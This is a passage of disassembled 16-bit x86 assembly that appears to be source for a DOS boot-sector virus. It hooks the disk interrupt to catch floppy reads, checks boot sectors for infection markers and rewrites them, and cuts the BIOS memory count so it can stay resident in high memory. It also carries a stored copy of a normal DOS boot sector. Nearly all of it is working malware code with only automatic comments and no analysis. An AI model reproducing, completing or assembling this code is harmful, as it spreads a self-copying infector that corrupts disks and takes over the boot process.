		jb	loc_0041		; Jump if below
;*		call	sub_0017		;*
		db	0E8h,0B7h, 02h
		jmp	short loc_0041
loc_0040:
		cmp	al,3Fh			; '?'
		jne	loc_0042		; Jump if not equal
loc_0041:
		mov	word ptr ds:warm_boot_flag_,1234h
		jmp	cs:data_0056
loc_0042:
		popf				; Pop flags
		pop	ds
		pop	cx
		pop	ax
		jmp	dword ptr cs:data_0052
;*		jmp	short loc_0044		;*
		db	0EBh, 0Ah
		add	[bx+di],al
		add	[bx+di],al
		jo	loc_0043		; Jump if overflow=1
loc_0043:
		popf				; Pop flags
		adc	[bp+si],ax
		add	ds:data_0010e[si],bx
		push	si
		push	di
		push	cs
		pop	ds
		mov	byte ptr ds:[528h],dh
		mov	byte ptr ds:[529h],dl
		mov	byte ptr ds:[52Ah],ch
		mov	byte ptr ds:[52Bh],cl
		mov	word ptr ds:[52Ch],es
		mov	word ptr ds:[52Eh],bx
		mov	byte ptr ds:[530h],ah
		mov	byte ptr data_0066,al	; ('WS      EXE ')
		cmp	ah,2
		jb	loc_0045		; Jump if below
		cmp	ah,5
		ja	loc_0045		; Jump if above
		cmp	dl,1
		ja	loc_0045		; Jump if above
		cmp	ch,0
		jne	loc_0045		; Jump if not equal
		cmp	dh,0
		jne	loc_0045		; Jump if not equal
		dec	cs:data_0051
		jz	loc_0046		; Jump if zero
loc_0045:
		jmp	short loc_0047
loc_0046:
		push	cs
		pop	es
		mov	cs:data_0051,2
		call	sub_0009
loc_0047:
		mov	dh,byte ptr ds:[528h]
		mov	dl,byte ptr ds:[529h]
		mov	ch,byte ptr ds:[52Ah]
		mov	cl,byte ptr ds:[52Bh]
		mov	es,word ptr ds:[52Ch]
		mov	bx,word ptr ds:[52Eh]
		mov	ah,byte ptr ds:[530h]
		mov	al,byte ptr data_0066	; ('WS      EXE ')
		pop	di
		pop	si
		pop	es
		pop	ds
		popf				; Pop flags
		jmp	dword ptr cs:data_0054

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0009	proc	near
		push	ax
		push	bx
		push	cx
		push	dx
		xor	ah,ah			; Zero register
		int	6Fh			; ??int non-standard interrupt
		jc	loc_0050		; Jump if carry Set
		xor	dh,dh			; Zero register
		mov	dl,byte ptr cs:[529h]
		mov	cx,1
		mov	bx,200h
		mov	ax,201h
		int	6Fh			; ??int non-standard interrupt
		jc	loc_0050		; Jump if carry Set
		cmp	data_0047,537Ch
		je	loc_0050		; Jump if equal
		cmp	data_0046,0FAFAh
		je	loc_0048		; Jump if equal
		cmp	data_0043,1234h
		jne	loc_0049		; Jump if not equal
		call	sub_0010
		jc	loc_0050		; Jump if carry Set
		jmp	short loc_0049
loc_0048:
;*		call	sub_0011		;*
		db	0E8h, 44h, 00h
		jc	loc_0050		; Jump if carry Set
loc_0049:
		mov	bx,200h
;*		call	sub_0013		;*
		db	0E8h,0E1h, 00h
		jc	loc_0050		; Jump if carry Set
;*		call	sub_0012		;*
		db	0E8h, 58h, 00h
loc_0050:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		retn
sub_0009	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0010	proc	near
		mul	byte ptr [bx+di]	; ax = data * al
		sub	[bx+si],al
		add	bl,ch
		xor	al,90h
		dec	cx
		inc	dx
		dec	bp
		and	[bx+si],ah
		xor	bp,ds:data_0036e
		add	al,[bp+si]
		add	[bx+si],ax
		add	dh,[bx+si+0]
		rol	byte ptr [bp+si],1	; Rotate
		std				; Set direction flag
		add	al,[bx+si]
		or	[bx+si],ax
		add	al,[bx+si]
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],al
		add	[bp+si],dl
		add	[bx+si],al
		add	[bx+si],al
		add	[bx+si],ax
		cli				; Disable interrupts
		xor	ax,ax			; Zero register
		mov	ss,ax
		mov	sp,7C00h
		push	ss
		pop	es
		mov	bx,data_0005e
		lds	si,dword ptr ss:[bx]	; Load 32 bit ptr
		push	ds
		push	si
		push	ss
		push	bx
		mov	di,data_0022e
		mov	cx,0Bh
		cld				; Clear direction

locloop_0051:
		lodsb				; String [si] to al
		cmp	byte ptr es:[di],0
		je	loc_0052		; Jump if equal
		mov	al,es:[di]
loc_0052:
		stosb				; Store al to es:[di]
		mov	al,ah
		loop	locloop_0051		; Loop if cx > 0

		push	es
		pop	ds
		mov	[bx+2],ax
		mov	word ptr [bx],7C2Bh
		sti				; Enable interrupts
		int	13h			; Disk  dl=drive ?  ah=func 00h
						;  reset disk, al=return status
		jc	loc_0055		; Jump if carry Set
		mov	al,ds:data_0014e
		cbw				; Convrt byte to word
		mul	word ptr ds:data_0017e	; ax = data * ax
		add	ax,ds:data_0020e
		add	ax,ds:data_0013e
		mov	ds:data_0028e,ax
		mov	ds:data_0023e,ax
		mov	ax,20h
		mul	word ptr ds:data_0015e	; ax = data * ax
		mov	bx,ds:data_0012e
		add	ax,bx
		dec	ax
		div	bx			; ax,dx rem=dx:ax/reg
		add	ds:data_0023e,ax
		mov	bx,500h
		mov	ax,ds:data_0028e
		call	sub_0015
		mov	ax,201h
		call	sub_0016
		jc	loc_0053		; Jump if carry Set
		mov	di,bx
		mov	cx,0Bh
		mov	si,data_0030e
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jnz	loc_0053		; Jump if not zero
		lea	di,[bx+20h]		; Load effective addr
		mov	si,data_0031e
		mov	cx,0Bh
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_0056		; Jump if zero
loc_0053:
		mov	si,data_0029e
loc_0054:
		call	sub_0014
		xor	ah,ah			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		pop	si
		pop	ds
		pop	word ptr [si]
		pop	word ptr [si+2]
		int	19h			; Bootstrap loader
loc_0055:
		mov	si,7DC0h
		jmp	short loc_0054
loc_0056:
		mov	ax,ds:data_0009e
		xor	dx,dx			; Zero register
		div	word ptr ds:data_0012e	; ax,dxrem=dx:ax/data
		inc	al
		mov	ds:data_0026e,al
		mov	ax,ds:data_0023e
		mov	ds:data_0027e,ax
		mov	bx,700h
loc_0057:
		mov	ax,ds:data_0023e
		call	sub_0015
		mov	ax,ds:data_0018e
		sub	al,ds:data_0025e
		inc	ax
		cmp	ds:data_0026e,al
		jae	loc_0058		; Jump if above or =
		mov	al,ds:data_0026e
loc_0058:
		push	ax
		call	sub_0016
		pop	ax
		jc	loc_0055		; Jump if carry Set
		sub	ds:data_0026e,al
		jz	loc_0059		; Jump if zero
		add	ds:data_0023e,ax
		mul	word ptr ds:data_0012e	; ax = data * ax
		add	bx,ax
		jmp	short loc_0057
loc_0059:
		mov	ch,ds:data_0016e
		mov	dl,ds:data_0032e
		mov	bx,ds:data_0027e
;*		jmp	far ptr loc_0001	;*
sub_0010	endp

		db	0EAh, 00h, 00h, 70h, 00h

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0014	proc	near
loc_0060:
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_ret_0061		; Jump if zero
		mov	ah,0Eh
		mov	bx,7
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_0060

;ﬂﬂﬂﬂ External Entry into Subroutine ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ

sub_0015:
		xor	dx,dx			; Zero register
		div	word ptr ds:data_0018e	; ax,dxrem=dx:ax/data
		inc	dl
		mov	ds:data_0025e,dl
		xor	dx,dx			; Zero register
		div	word ptr ds:data_0019e	; ax,dxrem=dx:ax/data
		mov	ds:data_0021e,dl
		mov	ds:data_0024e,ax

loc_ret_0061:
		retn
sub_0014	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0016	proc	near
		mov	ah,2
		mov	dx,ds:data_0024e
		mov	cl,6
		shl	dh,cl			; Shift w/zeros fill
		or	dh,ds:data_0025e
		mov	cx,dx
		xchg	ch,cl
		mov	dl,ds:data_0032e
		mov	dh,ds:data_0021e
		int	13h			; Disk  dl=drive ?  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		retn
sub_0016	endp

		db	0Dh, 0Ah, 'Non-System disk or dis'
		db	'k error', 0Dh, 0Ah, 'Replace and'
		db	' strike any key when ready', 0Dh
		db	0Ah, 0
		db	0Dh, 0Ah, 'Disk Boot failure', 0Dh
		db	0Ah, 0
		db	'IBMBIO  COMIBMDOS  COM'
		db	18 dup (0)
		db	 55h,0AAh, 00h, 03h, 00h, 00h
		db	 01h, 00h, 02h, 00h, 00h, 01h
		db	 00h, 01h, 00h, 00h, 01h, 00h
		db	 09h, 00h, 00h, 00h, 00h, 08h
		db	 00h, 00h, 00h, 00h, 07h, 00h
		db	 00h, 00h, 00h, 06h, 00h, 00h
		db	 00h, 00h, 05h, 00h, 00h, 00h
		db	0F6h, 04h, 00h, 00h, 00h,0FDh
		db	0FFh,0FFh, 00h
		db	509 dup (0)
		db	 03h, 00h, 00h, 00h,0F6h, 02h
		db	 00h, 00h, 00h,0FDh,0FFh,0FFh
		db	 00h
		db	508 dup (0)
		db	0F6h, 01h, 00h, 00h, 00h,0EBh
		db	 29h, 90h, 22h, 34h, 12h, 00h
		db	 01h, 00h, 00h, 00h, 00h, 02h
		db	 02h, 01h, 00h, 02h, 70h, 00h
		db	0D0h, 02h,0FDh, 02h, 00h, 09h
		db	 00h, 02h, 00h
		db	8 dup (0)
		db	 0Fh, 00h, 00h, 00h, 00h, 01h
		db	 00h
		db	0FAh,0FAh, 8Ch,0C8h, 8Eh,0D8h
		db	 8Eh,0D0h,0BCh, 00h,0F0h,0FBh
		db	0B8h, 78h, 7Ch, 50h,0C3h, 73h
		db	 0Ah
		db	0BBh, 90h, 7Ch, 53h,0C3h,0B9h
		db	0B0h, 7Ch, 51h,0C3h
loc_0064:
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	ax,ds:main_ram_size_
		cmp	word ptr ds:data_0008e,0
		jne	loc_0065		; Jump if not equal
		mov	ds:data_0008e,ax
		sub	ax,7
		mov	ds:main_ram_size_,ax
loc_0065:
		mov	cl,6
		shl	ax,cl			; Shift w/zeros fill
		push	cs
		pop	ds
		mov	es,ax
		mov	si,data_0164e
		xor	di,di			; Zero register
		mov	cx,1400h
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		push	es
		mov	ax,400h
		push	ax
		retf
		xor	ah,ah			; Zero register
		int	13h			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		jc	loc_0066		; Jump if carry Set
		xor	dx,dx			; Zero register
		mov	cx,2821h
		mov	bx,data_0178e
		mov	ax,209h
		int	13h			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
loc_0066:
;*		mov	ax,offset loc_0077	;*
		db	0B8h, 3Ch, 7Ch
		push	ax
		retn
		db	0BEh, 5Fh, 7Dh,0B9h, 48h, 00h

locloop_0067:
		xor	bh,bh			; Zero register
		mov	al,[si]
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		inc	si
		loop	locloop_0067		; Loop if cx > 0

loc_0068:
		xor	ah,ah			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						;  get keybd char in al, ah=scan
		mov	ah,1
		int	16h			; Keyboard i/o  ah=function 01h
						;  get status, if zf=0  al=char
		jnz	loc_0068		; Jump if not zero
;*		mov	bx,offset loc_0078	;*
		db	0BBh, 43h, 7Ch
		push	bx
		retn
		mov	ax,cs
		mov	ds,ax
		mov	es,ax
		mov	si,data_0176e
		mov	di,data_0178e
		mov	cx,18h
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
;*		mov	di,offset loc_0081	;*
		db	0BFh, 00h, 7Eh
		push	di
		retn
		db	 32h,0E4h,0CDh, 13h
loc_0069:
		jc	loc_0070		; Jump if carry Set
		xor	dx,dx			; Zero register
		mov	cx,1
		mov	bx,data_0164e
		mov	ax,201h
		int	13h			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
loc_0070:
;*		mov	bx,offset loc_0076	;*
		db	0BBh, 00h, 7Ch
		push	bx
		retn
		sub	al,7Ch			; '|'
		mov	ds:data_0175e,ax
		mov	bx,700h
loc_0071:
		mov	ax,ds:data_0171e
		call	sub_0018
		mov	ax,ds:data_0167e
		sub	al,ds:data_0173e
		inc	ax
		push	ax
		call	sub_0019
		pop	ax
		jc	loc_0069		; Jump if carry Set
		sub	ds:data_0174e,al
		jbe	loc_0072		; Jump if below or =
		add	ds:data_0171e,ax
		mul	word ptr ds:data_0165e	; ax = data * ax
		add	bx,ax
		jmp	short loc_0071
loc_0072:
		mov	ch,ds:data_0166e
		mov	dl,ds:data_0169e
		mov	bx,ds:data_0175e
;*		jmp	far ptr loc_0001	;*
		db	0EAh, 00h, 00h, 70h, 00h
loc_0073:
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_ret_0074		; Jump if zero
		mov	ah,0Eh
		mov	bx,7
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_0073

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0018	proc	near
		xor	dx,dx			; Zero register
		div	word ptr ds:data_0167e	; ax,dxrem=dx:ax/data
		inc	dl
		mov	ds:data_0173e,dl
		xor	dx,dx			; Zero register
		div	word ptr ds:data_0168e	; ax,dxrem=dx:ax/data
		mov	byte ptr ds:data_0169e+1,dl
		mov	ds:data_0172e,ax

loc_ret_0074:
		retn
sub_0018	endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;			       SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_0019	proc	near
		mov	ah,2
		mov	dx,ds:data_0172e
		mov	cl,6
		shl	dh,cl			; Shift w/zeros fill
		or	dh,ds:data_0173e
		mov	cx,dx
		xchg	ch,cl
		mov	dx,ds:data_0169e
		int	13h			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
						;   al=#,ch=cyl,cl=sectr,dh=head
		retn
sub_0019	endp

		db	0Dh, 0Ah, 'Non-System disk or dis'
		db	'k error', 0Dh, 0Ah, 'Replace and'
		db	' strike any key when ready', 0Dh
		db	0Ah, 0
		db	0Dh, 0Ah, 'Disk Boot failure', 0Dh
		db	0Ah, 0
		db	'IBMBIO  COMIBMDOS  COM'
		db	42 dup (0)
		db	 55h,0AAh

seg_a		ends



		end	start
